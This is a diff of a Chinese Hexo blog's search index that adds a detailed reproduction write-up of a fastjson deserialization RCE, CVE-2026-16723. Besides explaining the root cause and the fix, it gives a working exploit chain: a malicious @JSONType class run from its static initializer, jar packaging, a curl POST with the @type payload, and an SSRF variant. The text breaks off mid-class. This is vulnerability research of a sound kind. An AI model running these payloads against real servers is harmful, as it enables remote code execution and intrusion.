@@ -1,20 +1,8 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>你好，博客</title>
-    <url>/2026/11/05/%E7%94%9F%E6%B4%BB/hello-blog/</url>
-    <content><![CDATA[<p>这是第一篇文章。博客用 Hexo 8 + NexT 8 搭成，纯静态，托管在云端，不需要服务器。</p>
-]]></content>
-      <categories>
-        <category>生活</category>
-      </categories>
-      <tags>
-        <tag>随笔</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>使用说明，关于后期修改和文章上传</title>
-    <url>/2026/11/07/%E7%94%9F%E6%B4%BB/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
+    <title>使用说明</title>
+    <url>/2026/11/06/%E7%94%9F%E6%B4%BB/%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/</url>
     <content><![CDATA[<h1 id="博客使用说明"><a href="#博客使用说明" class="headerlink" title="博客使用说明"></a>博客使用说明</h1><p>Hexo 8 + NexT 8（Gemini 主题）静态博客，已配好站内搜索、分类&#x2F;标签、归档、RSS、sitemap、阅读进度、代码复制按钮、深色模式、手机自适应、推送即上线。</p>
 <table>
 <thead>
@@ -33,7 +21,7 @@
 </tr>
 <tr>
 <td>仓库</td>
-<td><a href="mailto:&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#x6d;">&#103;&#x69;&#x74;&#64;&#x67;&#x69;&#x74;&#x68;&#117;&#x62;&#46;&#99;&#111;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
+<td><a href="mailto:&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;">&#x67;&#105;&#x74;&#x40;&#103;&#x69;&#116;&#x68;&#117;&#98;&#46;&#99;&#x6f;&#x6d;</a>:qincaidunxueli&#x2F;my-blog.git（<code>main</code>）</td>
 </tr>
 <tr>
 <td>部署</td>
@@ -611,14 +599,774 @@
       </tags>
   </entry>
   <entry>
+    <title>你好，博客</title>
+    <url>/2026/11/05/%E7%94%9F%E6%B4%BB/hello-blog/</url>
+    <content><![CDATA[<p>这是第一篇文章。博客用 Hexo 8 + NexT 8 搭成，纯静态，托管在云端，不需要服务器。</p>
+]]></content>
+      <categories>
+        <category>生活</category>
+      </categories>
+      <tags>
+        <tag>随笔</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>CVE-2026-16723 复现总结</title>
+    <url>/2026/11/08/%E6%8A%80%E6%9C%AF/JAVA%E5%AE%89%E5%85%A8/Fastjson/SUMMARY/</url>
+    <content><![CDATA[<p><strong>简单说明该漏洞成因</strong>：Fastjson 在判断 <code>@type</code> 是否可信时，把用户可控的这个字符串当作“资源名”交给 <code>URLClassLoader</code> 读取——由于 <code>URLClassLoader</code> 会把它当成 URL 打开，攻击者写一个 <code>jar:file:</code> 路径就能让目标加载自己提供的类，类的静态代码块随即可执行</p>
+<p><strong>简单说明怎么利用的</strong>：一句话：<strong>在目标磁盘上放一个“加了 <code>@JSONType</code> 注解、静态块里写命令”的 jar，然后发一个 <code>@type</code> 指向它的 JSON</strong>。</p>
+<p>四步：</p>
+<p><strong>1. 写一个类</strong></p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@JSONType</span>                                    <span class="comment">// ← 白名单通行证，必须有</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                 <span class="comment">// ← 类初始化时自动执行</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;calc.exe&quot;</span>).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>2. 编译并改名，打成 jar</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">javac --release 8 -<span class="built_in">cp</span> fastjson-1.2.83.jar -d . Evil.java</span><br><span class="line">python patch_name.py Evil.class <span class="string">&#x27;jar:file:/C:/fj/f!/Evil&#x27;</span> Evil.class   <span class="comment"># 改 this_class</span></span><br><span class="line">jar cf payload.jar Evil.class &amp;&amp; <span class="built_in">cp</span> payload.jar /c/fj/f</span><br></pre></td></tr></table></figure>
+
+<p>改名是因为 JVM 要求“请求的类名”和 class 自己声明的名字逐字相同，而 fastjson 传进去的是 <code>jar:file:/C:/fj/f!/Evil</code> 这种带 <code>:</code> <code>!</code> 的名字。</p>
+<p><strong>3. 让这个 jar 落到目标机器上</strong>（上传接口、临时目录、共享缓存都行；演示时直接放 <code>C:\fj\f</code>）</p>
+<p><strong>4. 发一个请求</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -X POST http://target/parse -H <span class="string">&#x27;Content-Type: application/json&#x27;</span> \</span><br><span class="line">  -d <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;jar:file:.C:.fj.f!.Evil&quot;&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>注意 <code>@type</code> 里用<strong>点代替斜杠</strong>，因为 fastjson 会把点换成 <code>/</code>，还原后正好是 <code>jar:file:/C:/fj/f</code>。</p>
+<p>然后目标 JVM 就会：把这个字符串当 URL 打开 → 读到你的 class → 扫到 <code>@JSONType</code> 判定可信 → <code>defineClass</code> 定义它 → <code>&lt;clinit&gt;</code> 执行 → 弹出计算器。</p>
+<p><strong>判断成功别看返回体</strong>，看副作用：计算器进程、证明文件的 mtime。<code>ok:true</code> 只代表“类加载成功”，同一个类名第二次打会命中缓存、不会重新执行。</p>
+<p><strong>唯一的前提</strong>（也是唯一要说清的限制）：第 3 步的 jar 必须先到目标磁盘上。远程 <code>jar:http://</code> 打不到 <code>defineClass</code>，因为类名里会出现 <code>//</code>，JVM 直接拒绝。</p>
+<span id="more"></span>
+<h1 id="CVE-2026-16723-复现总结"><a href="#CVE-2026-16723-复现总结" class="headerlink" title="CVE-2026-16723 复现总结"></a>CVE-2026-16723 复现总结</h1><p>fastjson 1.2.68 ~ 1.2.83 · 默认配置反序列化 RCE · CVSS 9.0 · 1.2.84 修复</p>
+<blockquote>
+<p>本文所有结论都在本机（Windows 10 &#x2F; JDK 8u66）与 Ubuntu 虚机（JDK 17）上实测过，<br>报错原文、字节数、返回字段均为实测值，不是从公告里抄的。</p>
+</blockquote>
+<p><strong>阅读顺序</strong>：前置（要准备什么）→ 1（这洞是什么、凭什么能打）→ 2（payload 怎么造）→ 3（怎么一步步复现）。</p>
+<hr>
+<h1 id="前置：复现这个漏洞需要什么"><a href="#前置：复现这个漏洞需要什么" class="headerlink" title="前置：复现这个漏洞需要什么"></a>前置：复现这个漏洞需要什么</h1><h2 id="0-1-一句话"><a href="#0-1-一句话" class="headerlink" title="0.1 一句话"></a>0.1 一句话</h2><p><strong>一台能跑 Java 的机器 + 一个用漏洞版本 fastjson 的 Web 应用 + 一个按目标路径定制好的 class 文件。</strong><br>不需要外网、不需要 Docker、不需要数据库、不需要中间件、不需要任何 gadget。</p>
+<h2 id="0-2-软硬件清单"><a href="#0-2-软硬件清单" class="headerlink" title="0.2 软硬件清单"></a>0.2 软硬件清单</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>要求</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>操作系统</td>
+<td>Windows 10&#x2F;11 或 Ubuntu 20.04+</td>
+<td>两条路都实测打通</td>
+</tr>
+<tr>
+<td>JDK</td>
+<td>8 &#x2F; 11 &#x2F; 17 &#x2F; 21 任一</td>
+<td>实测 8u66、17.0.20、21.0.10 均可</td>
+</tr>
+<tr>
+<td>内存</td>
+<td>512 MB 空闲</td>
+<td>应用本体是 18 MB 的 fat-JAR</td>
+</tr>
+<tr>
+<td>编译工具</td>
+<td>任一 <code>javac</code> + <code>jar</code></td>
+<td>必须支持 <code>--release 8</code>；JDK 21 的 javac 也行</td>
+</tr>
+<tr>
+<td>运行时工具</td>
+<td><code>curl</code>；<code>python3</code>（改类名用）</td>
+<td>Ubuntu 缺 curl：<code>sudo apt install curl</code></td>
+</tr>
+<tr>
+<td>外网</td>
+<td><strong>不需要</strong></td>
+<td>全程走 <code>127.0.0.1</code></td>
+</tr>
+<tr>
+<td>Docker &#x2F; 数据库 &#x2F; MQ</td>
+<td><strong>不需要</strong></td>
+<td>裸 JVM 直接跑</td>
+</tr>
+</tbody></table>
+<h2 id="0-3-四个技术前提（缺一不可）"><a href="#0-3-四个技术前提（缺一不可）" class="headerlink" title="0.3 四个技术前提（缺一不可）"></a>0.3 四个技术前提（缺一不可）</h2><table>
+<thead>
+<tr>
+<th>#</th>
+<th>前提</th>
+<th>怎么确认</th>
+<th>不满足的表现</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>fastjson 在 <strong>1.2.68 ~ 1.2.83</strong></td>
+<td><code>mvn dependency:tree | grep fastjson</code></td>
+<td>1.2.84+ 直接 <code>autoType is not support</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>默认 classloader 是 <strong><code>URLClassLoader</code> 家族</strong></td>
+<td><code>/status</code> 的 <code>launchedBy</code> 字段</td>
+<td><code>stream=false</code>，链断在读取第一步</td>
+</tr>
+<tr>
+<td>3</td>
+<td><strong>没开 SafeMode</strong>，不是 <code>noneautotype</code> 构建</td>
+<td><code>/status</code> 的 <code>safeMode</code> 字段</td>
+<td>探测请求都发不出去</td>
+</tr>
+<tr>
+<td>4</td>
+<td>有接口把请求体交给 <strong><code>JSON.parse</code></strong></td>
+<td>看业务代码</td>
+<td>根本进不了 <code>checkAutoType</code></td>
+</tr>
+</tbody></table>
+<p><strong>第 2 条是绝大多数复现失败的真正原因。</strong> Spring Boot fat-JAR 的 <code>LaunchedURLClassLoader</code> 是 <code>URLClassLoader</code> 子类，<code>java -jar</code> 启动天然满足；但某些部署形态拿到的是普通 <code>AppClassLoader</code>，同一个 payload 就是 <code>stream=false</code>。</p>
+<h2 id="0-4-需要准备的四个文件"><a href="#0-4-需要准备的四个文件" class="headerlink" title="0.4 需要准备的四个文件"></a>0.4 需要准备的四个文件</h2><table>
+<thead>
+<tr>
+<th>文件</th>
+<th>作用</th>
+<th>本项目位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>靶场应用（漏洞版）</td>
+<td>被打的那一方</td>
+<td><code>out/app-vuln-1.2.83.jar</code></td>
+</tr>
+<tr>
+<td>payload 的 Java 源码</td>
+<td>要执行的代码</td>
+<td><code>payload/windows/Evil.java</code></td>
+</tr>
+<tr>
+<td>改类名脚本</td>
+<td>让 class 自称 <code>jar:file:.../Evil</code></td>
+<td><code>payload/patch_name.py</code></td>
+</tr>
+<tr>
+<td>对照应用（修复版）</td>
+<td>证明”同一 payload 打不动”</td>
+<td><code>out/app-fixed-1.2.84.jar</code></td>
+</tr>
+</tbody></table>
+<h2 id="0-5-这些都不需要（常见误解）"><a href="#0-5-这些都不需要（常见误解）" class="headerlink" title="0.5 这些都不需要（常见误解）"></a>0.5 这些都不需要（常见误解）</h2><ul>
+<li>不需要 <code>autoTypeSupport=true</code>——默认 <code>false</code> 照样打穿，这是本漏洞最反直觉的地方；</li>
+<li>不需要 classpath 上有 CommonsCollections &#x2F; JdbcRowSetImpl 之类 gadget；</li>
+<li>不需要目标能出网——<code>jar:file:</code> 形态完全离线；</li>
+<li>不需要 <code>/proc/self/fd</code>——那是”jar 只存在于进程 fd 上”时的补充路径，本次未用到。</li>
+</ul>
+<h2 id="0-6-三种部署形态，三种能力"><a href="#0-6-三种部署形态，三种能力" class="headerlink" title="0.6 三种部署形态，三种能力"></a>0.6 三种部署形态，三种能力</h2><table>
+<thead>
+<tr>
+<th>形态</th>
+<th>环境要求</th>
+<th>能做到</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>单机自打</td>
+<td>一台机器</td>
+<td>全链贯通，代码执行</td>
+</tr>
+<tr>
+<td>跨机（攻击机 + 靶机同网段）</td>
+<td>靶机端口可达</td>
+<td>全链贯通，效果最真实</td>
+</tr>
+<tr>
+<td>纯远程（只有 HTTP 可达）</td>
+<td>无需接触目标磁盘</td>
+<td>只能到 SSRF + 信任伪造，<strong>打不到 <code>defineClass</code></strong></td>
+</tr>
+</tbody></table>
+<p>第三种形态的天花板是漏洞本身决定的，第 1.4 节解释原因。</p>
+<hr>
+<h1 id="1-这个漏洞是什么"><a href="#1-这个漏洞是什么" class="headerlink" title="1. 这个漏洞是什么"></a>1. 这个漏洞是什么</h1><h2 id="1-1-一条-JSON-变成代码执行"><a href="#1-1-一条-JSON-变成代码执行" class="headerlink" title="1.1 一条 JSON 变成代码执行"></a>1.1 一条 JSON 变成代码执行</h2><p>正常反序列化请求：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;tom&quot;</span><span class="punctuation">,</span><span class="attr">&quot;age&quot;</span><span class="punctuation">:</span><span class="number">18</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>fastjson 允许在 JSON 里写 <code>@type</code>，声明”这段数据还原成哪个类”：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.example.User&quot;</span><span class="punctuation">,</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;tom&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>问题就在这个 <code>@type</code> 上。它语义上应该是<strong>一个类名</strong>，但 fastjson 在处理它之前会先拿这个字符串去**查”有没有对应的 class 文件”**，用来判断类型是否可信。</p>
+<p>而这个”查”用的是 <code>ClassLoader.getResourceAsStream(name)</code>。对 <code>URLClassLoader</code> 来说，<code>name</code> 不一定是类路径，<strong>它可以是 URL</strong>。</p>
+<p>于是：</p>
+<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;jar:file:.C:.fj.f!.Evil&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>目标进程会去打开 <code>jar:file:/C:/fj/f</code>，取出里面 <code>Evil.class</code> 的字节，用 ASM 扫到 <code>@JSONType</code> 注解，判定”这是可信类型”，然后定义它、实例化它——<strong>静态初始化块随之执行，代码就跑起来了。</strong></p>
+<h2 id="1-2-与-1-2-68-之前漏洞的最大区别"><a href="#1-2-与-1-2-68-之前漏洞的最大区别" class="headerlink" title="1.2 与 1.2.68 之前漏洞的最大区别"></a>1.2 与 1.2.68 之前漏洞的最大区别</h2><p>fastjson 的漏洞史可以一刀切成两段，分界线正好是 <strong>1.2.68</strong>，也就是本漏洞的引入版本。</p>
+<table>
+<thead>
+<tr>
+<th>维度</th>
+<th>≤ 1.2.67（AutoType 绕过家族）</th>
+<th>1.2.68 ~ 1.2.83（本漏洞）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>漏洞性质</td>
+<td>检查逻辑被<strong>绕过</strong>（bypass）</td>
+<td>检查逻辑被<strong>当成加载器使用</strong>（injection）</td>
+</tr>
+<tr>
+<td>攻击者要解决的问题</td>
+<td>找一个 classpath 上已有、且能触发危险动作的类</td>
+<td>自己写一个类，不需要任何 gadget</td>
+</tr>
+<tr>
+<td>攻击者控制的对象</td>
+<td><strong>选哪个类</strong>（类名只是数据）</td>
+<td><strong>类的内容本身</strong>（类名即路径，jar 即载荷）</td>
+</tr>
+<tr>
+<td>默认配置</td>
+<td>多数要 <code>autoTypeSupport=true</code>；少数靠缓存绕过可在默认下打</td>
+<td>默认配置即可，实测 <code>autoTypeSupport=false</code> 照样打穿</td>
+</tr>
+<tr>
+<td>第三方依赖</td>
+<td>依赖 gadget 在 classpath（<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code>，或 mybatis、xbean、shiro 等）</td>
+<td>零依赖，JDK 自带即可</td>
+</tr>
+<tr>
+<td>出网要求</td>
+<td>JNDI 类要求目标能回连攻击者的 LDAP&#x2F;RMI</td>
+<td>完全不出网（<code>jar:file:</code> 本地路径）</td>
+</tr>
+<tr>
+<td>JDK 限制</td>
+<td><code>TemplatesImpl</code> 受 JDK 版本&#x2F;模块限制，高版本常失效</td>
+<td>class 版本对齐即可，实测 8u66 &#x2F; 17 &#x2F; 21 均可</td>
+</tr>
+<tr>
+<td>CVE 形态</td>
+<td><strong>点版本</strong>：1.2.42、1.2.47……每个版本一个绕过</td>
+<td><strong>区间</strong>：同一个设计缺陷贯穿 1.2.68 ~ 1.2.83</td>
+</tr>
+<tr>
+<td>修复手段</td>
+<td>逐个加黑名单、加缓存校验（1.2.25 → 1.2.67 打了十几轮）</td>
+<td>一个字符校验，4 行，拦 <code>:</code> 和 <code>!</code></td>
+</tr>
+<tr>
+<td>流量特征</td>
+<td><code>@type</code> 是已知 gadget 类名</td>
+<td><code>@type</code> 里含 <code>:</code>、<code>!</code>、<code>..</code>、<code>jar:</code>、<code>http:</code></td>
+</tr>
+</tbody></table>
+<p><strong>三条更本质的差异：</strong></p>
+<p><strong>① 载荷从”数据”变成”代码”。</strong> 旧漏洞的 payload 是一段 JSON，它能做什么取决于<strong>目标机器上装了什么</strong>——同一段 JSON 打不同环境成功率天差地别，这也是旧漏洞”复现靠运气”的原因。本漏洞的 payload 是一个 class 文件，<strong>代码由攻击者自己提供</strong>，所以不挑环境、不出网、不挑 JDK。代价是多了个前置：jar 得先落到目标磁盘上。</p>
+<p><strong>② CVE 形态从”点版本”变成”区间”。</strong> 1.2.42、1.2.47 这些 CVE 对应的是”上一个补丁没打全”，所以每个版本一个编号、修完就没了。本漏洞是 1.2.68 引入的一段设计本身有问题，整段版本全部受影响——这也是它 CVSS 9.0 的原因：默认可打、无 gadget、无出网要求，三个传统门槛全被拆掉。</p>
+<p><strong>③ 补丁从”加类名”变成”改语法”。</strong> 旧漏洞的攻击面是”类的集合”，所以黑名单能堵，虽然堵得很累。本漏洞的攻击面是”字符串的语法”——<code>jar:file:</code>、<code>http:</code>、<code>../</code>、<code>/proc/self/fd</code>，路径写法无穷多，黑名单天然堵不住。所以 1.2.84 不是”再加几个类名”，而是<strong>在入口拒绝非法字符</strong>。</p>
+<p><strong>历史脉络</strong>（公开披露的代表性样本，不是完整列表）：1.2.24 及以前 AutoType 默认开启，<code>TemplatesImpl</code> &#x2F; <code>JdbcRowSetImpl</code> 直打；1.2.25 关闭 AutoType 并引入黑名单，此后进入长期补丁战——1.2.25 ~ 1.2.41 的 <code>[</code> 前缀绕过、1.2.42 的 <code>L...;</code>、1.2.43 的 <code>LL...;;</code>、1.2.47 的 <code>java.lang.Class</code> 缓存投毒、1.2.55 ~ 1.2.67 的黑名单扩充。</p>
+<p><strong>为什么 1.2.68 成了分界</strong>：这个版本为了支持 <code>@JSONType</code> 自声明与 SafeMode，在 <code>checkAutoType</code> 里加了”读一下 class 文件、看有没有注解”的探测。设计初衷是让库作者自己标注可信类型，副作用却是把用户可控的 <code>@type</code> 变成了一个<strong>能拼进 URL 的字符串</strong>。修旧漏洞的过程中引入了新原语，这是防御代码最常见的翻车方式。</p>
+<h2 id="1-3-为什么能被利用：一行代码里的四个失误"><a href="#1-3-为什么能被利用：一行代码里的四个失误" class="headerlink" title="1.3 为什么能被利用：一行代码里的四个失误"></a>1.3 为什么能被利用：一行代码里的四个失误</h2><p>漏洞本体在 <code>com.alibaba.fastjson.parser.ParserConfig.checkAutoType()</code>，1.2.83 的 1479–1498 行：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1479</span>  <span class="type">boolean</span> <span class="variable">jsonType</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line"><span class="number">1480</span>  <span class="type">InputStream</span> <span class="variable">is</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"><span class="number">1481</span>  <span class="keyword">try</span> &#123;</span><br><span class="line"><span class="number">1482</span>      <span class="type">String</span> <span class="variable">resource</span> <span class="operator">=</span> typeName.replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>) + <span class="string">&quot;.class&quot;</span>;</span><br><span class="line"><span class="number">1483</span>      <span class="keyword">if</span> (defaultClassLoader != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1484</span>          is = defaultClassLoader.getResourceAsStream(resource);</span><br><span class="line"><span class="number">1485</span>      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">1486</span>          is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);</span><br><span class="line"><span class="number">1487</span>      &#125;</span><br><span class="line"><span class="number">1488</span>      <span class="keyword">if</span> (is != <span class="literal">null</span>) &#123;</span><br><span class="line"><span class="number">1489</span>          <span class="type">ClassReader</span> <span class="variable">classReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassReader</span>(is, <span class="literal">true</span>);</span><br><span class="line"><span class="number">1490</span>          <span class="type">TypeCollector</span> <span class="variable">visitor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TypeCollector</span>(<span class="string">&quot;&lt;clinit&gt;&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="number">1491</span>          classReader.accept(visitor);</span><br><span class="line"><span class="number">1492</span>          jsonType = visitor.hasJsonType();</span><br><span class="line"><span class="number">1493</span>      &#125;</span><br><span class="line"><span class="number">1494</span>  &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"><span class="number">1495</span>      <span class="comment">// skip</span></span><br><span class="line"><span class="number">1496</span>  &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"><span class="number">1497</span>      IOUtils.close(is);</span><br><span class="line"><span class="number">1498</span>  &#125;</span><br></pre></td></tr></table></figure>
+
+<p>四个失误叠在一起，才构成可利用性：</p>
+<ol>
+<li><strong><code>typeName</code> 没做任何字符校验</strong>，直接拼成资源名（1482）；</li>
+<li><strong>把”资源查找”用在了语义上应该是”类名解析”的地方</strong>——<code>getResourceAsStream</code> 对 <code>URLClassLoader</code> 等于”打开这个 URL”（1484）；</li>
+<li><strong>信任判定只看 class 里有没有 <code>@JSONType</code> 注解，不看这个类从哪来</strong>（1492）；</li>
+<li><strong>异常被 <code>catch (Exception e) { // skip }</code> 静默吞掉</strong>，业务侧完全无感（1494）。</li>
+</ol>
+<p>第 4 点让整个探测阶段天然无声：目标已经替你访问了任意地址，日志里却什么都不会留。</p>
+<p><strong>信任信号为什么能被伪造</strong>（<code>asm/TypeCollector</code>，69–72 行）：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">void</span> <span class="title function_">visitAnnotation</span><span class="params">(String desc)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (JSONType.equals(desc)) &#123;</span><br><span class="line">        jsonType = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>判定规则只有一条：**class 文件的注解表里出现 <code>Lcom/alibaba/fastjson/annotation/JSONType;</code> 这个描述符，就算”可信”**。攻击者在自己类头上写一个 <code>@JSONType</code>，等于给自己发了一张白名单通行证——<code>checkAutoType</code> 拿到 <code>jsonType=true</code> 后，在 1500 行的分支里直接 <code>return clazz</code>，AutoType 黑白名单完全不看。</p>
+<p><strong>完整调用链</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JSON.parse(body)</span><br><span class="line">  └─ ParserConfig.checkAutoType(&quot;@type 的值&quot;)</span><br><span class="line">       ├─ typeName.replace(&#x27;.&#x27;, &#x27;/&#x27;) + &quot;.class&quot;</span><br><span class="line">       ├─ defaultClassLoader.getResourceAsStream(...)      → URLClassLoader 当 URL 打开</span><br><span class="line">       │    └─ SSRF / 读任意 jar 里的字节码</span><br><span class="line">       ├─ TypeCollector 用 ASM 扫字节，看有没有 @JSONType   → 信任信号可伪造</span><br><span class="line">       └─ TypeUtils.loadClass(typeName, loader, true)</span><br><span class="line">            └─ URLClassLoader.findClass</span><br><span class="line">                 └─ defineClass(typeName, bytes)            → 类被定义</span><br><span class="line">                      └─ &lt;clinit&gt; 执行                      → 代码执行</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-能力边界：三种-type-写法"><a href="#1-4-能力边界：三种-type-写法" class="headerlink" title="1.4 能力边界：三种 @type 写法"></a>1.4 能力边界：三种 <code>@type</code> 写法</h2><p>直觉上”让目标去下载我服务器上的 jar”才是完整远程利用，但这条路有一道过不去的坎：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">@type        jar:http:..2130706433:19090.f!.Evil</span><br><span class="line">   ↓ 点号换斜杠</span><br><span class="line">请求的类名     jar:http://2130706433:19090/f!/Evil</span><br><span class="line">                    ↑↑ 空包段</span><br></pre></td></tr></table></figure>
+
+<p>JVM 内部类名不允许出现空包段，<code>//</code> 直接导致：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">java.lang.ClassFormatError: Illegal class name &quot;jar:http://2130706433:19090/f!/Evil&quot;</span><br></pre></td></tr></table></figure>
+
+<p>而这个 <code>//</code> 去不掉——URL 的 <code>scheme://</code> 天然带两个斜杠。</p>
+<table>
+<thead>
+<tr>
+<th><code>@type</code> 写法</th>
+<th>能做到</th>
+<th>做不到</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>http://...</code></td>
+<td>SSRF，目标主动外连</td>
+<td>其它任何事</td>
+</tr>
+<tr>
+<td><code>jar:http://...!</code></td>
+<td>SSRF + 拉取并识别 <code>@JSONType</code>（信任伪造成立）</td>
+<td><code>defineClass</code>（类名非法）</td>
+</tr>
+<tr>
+<td><code>jar:file:/path/f!</code></td>
+<td>全链贯通，代码执行</td>
+<td>——</td>
+</tr>
+</tbody></table>
+<p><strong>结论：这个洞的真实利用条件是”先让一个 jar 落到目标磁盘上”，再用 <code>jar:file:</code> 打。</strong> 落地手段可能是上传功能、临时目录写入、共享缓存、日志投递等。汇报时不要省这一步，否则会被”哪来的一发 getshell”问住。</p>
+<blockquote>
+<p><code>2130706433</code> 是 <code>127.0.0.1</code> 的十进制写法——因为 <code>@type</code> 里的点会被替换掉，凡是需要保留点的地址都得换成无点形式。</p>
+</blockquote>
+<h2 id="1-5-三个常见误解"><a href="#1-5-三个常见误解" class="headerlink" title="1.5 三个常见误解"></a>1.5 三个常见误解</h2><table>
+<thead>
+<tr>
+<th>误解</th>
+<th>实际</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>“要开 <code>autoTypeSupport=true</code> 才能打”</td>
+<td>不需要。默认 <code>false</code>，实测 <code>autoTypeSupport:false</code> 依然 <code>ok:true</code></td>
+</tr>
+<tr>
+<td>“要 classpath 上有 CommonsCollections 之类 gadget”</td>
+<td>不需要。要执行的代码由攻击者自己提供，不走链式调用</td>
+</tr>
+<tr>
+<td>“把入参类型写死成 DTO 就安全”</td>
+<td>不成立。DTO 里有 <code>Object</code> &#x2F; <code>Map</code> &#x2F; 泛型字段，payload 塞进去一样会走 <code>checkAutoType</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="2-payload-怎么构造"><a href="#2-payload-怎么构造" class="headerlink" title="2. payload 怎么构造"></a>2. payload 怎么构造</h1><h2 id="2-1-形态：一个-class，装在一个最小-jar-里"><a href="#2-1-形态：一个-class，装在一个最小-jar-里" class="headerlink" title="2.1 形态：一个 class，装在一个最小 jar 里"></a>2.1 形态：一个 class，装在一个最小 jar 里</h2><p>payload 不是脚本、不是 gadget 链，而是<strong>一个自己写的 Java 类</strong>，编译后打成最小的 jar：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">f                        ← 只有 1.6 KB 的 jar</span><br><span class="line">├── Evil.class           ← 必须在 jar 根目录（默认包）</span><br><span class="line">└── META-INF/MANIFEST.MF</span><br></pre></td></tr></table></figure>
+
+<p>为什么不直接用裸 class？因为 <code>@type</code> 要写成 <code>jar:file:...!/Evil</code> 这种形式，才能让 <code>URLClassLoader</code> 把”读取”和”类名”绑在一起——<code>!</code> 前面的部分是容器，后面的是容器内的路径。</p>
+<h2 id="2-2-类的内容"><a href="#2-2-类的内容" class="headerlink" title="2.2 类的内容"></a>2.2 类的内容</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.annotation.JSONType;</span><br><span class="line"><span class="keyword">import</span> java.nio.charset.StandardCharsets;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.*;</span><br><span class="line"></span><br><span class="line"><span class="meta">@JSONType</span>                                    <span class="comment">// ← 通行证，没有它后面全不成立</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Evil</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;                                 <span class="comment">// ← 执行点：类初始化时自动跑</span></span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        sb.append(<span class="string">&quot;jvm-user : &quot;</span>).append(System.getProperty(<span class="string">&quot;user.name&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;java     : &quot;</span>).append(System.getProperty(<span class="string">&quot;java.version&quot;</span>)).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        sb.append(<span class="string">&quot;loader   : &quot;</span>).append(Evil.class.getClassLoader()).append(<span 